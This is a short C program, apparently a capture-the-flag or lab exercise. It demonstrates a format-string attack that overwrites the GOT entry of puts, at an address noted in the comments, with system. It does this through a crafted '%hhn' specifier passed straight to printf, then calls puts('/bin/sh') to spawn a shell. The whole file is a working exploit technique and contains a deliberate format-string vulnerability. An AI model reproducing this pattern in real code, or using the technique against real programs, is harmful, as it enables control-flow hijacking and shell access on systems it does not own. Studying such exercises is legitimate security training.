#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//got address:
//system 0x804a018
//puts   0x804a014

char buf[0x100]={0,};
unsigned int pri_addr=0x804a014;
char* bin="/bin/sh\0";
char* string="%%1$176s%%15$hhn";

int main()
{
	char* ptr=string;
	char BUF[0x100];
	char format[0x20];
	char* string="aaaaaaaa";

	*(unsigned int*)format=pri_addr;

	system("sleep 0.1");
	for(int i=4;i<32;i++)
	  format[i]=*ptr++;
	
	sprintf(BUF,format,string);
	printf(BUF);

	memcpy(buf,bin,8);
	puts(buf);

	return 0;
}
